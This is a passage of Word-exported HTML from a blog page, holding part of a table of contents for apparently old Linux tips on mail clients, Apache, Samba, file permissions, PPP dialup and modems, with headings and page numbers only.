POP3 in Pine<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >14</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894752"  ><FONT face="Times New Roman"  >3.4<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 4: Multiple accounts in Pine<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >14</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894753"  ><FONT face="Times New Roman"  >3.5<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 5: Running Java programs<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >14</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894754"  ><FONT face="Times New Roman"  >3.6<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 6: Virtual hosts in Apache<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >14</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894755"  ><FONT face="Times New Roman"  >3.7<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 7: Libc versus Glibc<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >15</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894756"  ><FONT face="Times New Roman"  >3.8<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 8: Aliases with Qmail<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >15</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894757"  ><FONT face="Times New Roman"  >3.9<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 9: Samba with Windows 98 or NT 4<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >15</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894758"  ><FONT face="Times New Roman"  >3.10<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 10: KDE drag and drop icons<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >15</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894759"  ><FONT face="Times New Roman"  >3.11<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 11: Find files<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894760"  ><FONT face="Times New Roman"  >3.12<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 12: asm or linux include files not found<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894761"  ><FONT face="Times New Roman"  >3.13<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 13: ICQ on Linux<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894762"  ><FONT face="Times New Roman"  >3.14<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 14: Reading foreign documents<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894763"  ><FONT face="Times New Roman"  >3.15<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 15: Scanning with Linux<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894764"  ><FONT face="Times New Roman"  >3.16<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 16: Real audio and video<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >16</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894765"  ><FONT face="Times New Roman"  >3.17<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 17: Emulation<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >17</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894766"  ><FONT face="Times New Roman"  >3.18<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 18: Shared library not found<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >17</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894767"  ><FONT face="Times New Roman"  >3.19<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 19: Hard to erase files<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >17</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894768"  ><FONT face="Times New Roman"  >3.20<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 20: Files permissions<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >17</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894769"  ><FONT face="Times New Roman"  >3.21<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 21: Changing file permissions<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >18</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894770"  ><FONT face="Times New Roman"  >3.22<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 22: An international background<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >18</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894771"  ><FONT face="Times New Roman"  >3.23<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 23: Powerful file transfer system<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >18</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894772"  ><FONT face="Times New Roman"  >3.24<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 24: Editing in text editors<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >18</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894773"  ><FONT face="Times New Roman"  >3.25<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 25: Documentation and manual<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >19</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; tab-stops: 21.0pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894774"  ><FONT face="Times New Roman"  >4.<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Networking<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >19</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894775"  ><FONT face="Times New Roman"  >4.1<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 1: Easy PPP dialup<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >19</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894776"  ><FONT face="Times New Roman"  >4.2<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 2: Internet for your LAN<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >19</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894777"  ><FONT face="Times New Roman"  >4.3<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 3: Domains to search in<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >20</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894778"  ><FONT face="Times New Roman"  >4.4<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 4: Display IP rather than hostname<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >20</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894779"  ><FONT face="Times New Roman"  >4.5<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 5: Is my modem a winmodem?<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >20</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 